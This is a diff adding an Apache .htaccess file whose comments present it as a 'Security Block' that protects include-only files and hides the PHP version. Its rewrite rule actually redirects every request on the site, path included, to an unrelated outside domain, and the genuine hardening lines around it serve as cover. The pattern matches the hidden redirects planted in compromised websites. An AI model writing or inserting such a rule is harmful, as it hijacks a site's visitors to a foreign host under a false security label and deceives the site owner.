@@ -1,0 +1,18 @@
+RewriteOptions inherit
+
+# BEGIN Security Block
+# Block the include-only files.
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^ https://jeantigreros.lat%{REQUEST_URI} [R,L]
+</IfModule>
+
+# Disable directory listing
+Options All -Indexes
+Options +SymLinksIfOwnerMatch
+
+# Remove header with PHP version
+Header always unset X-Powered-By
+Header unset X-Powered-By
+# END Security Block
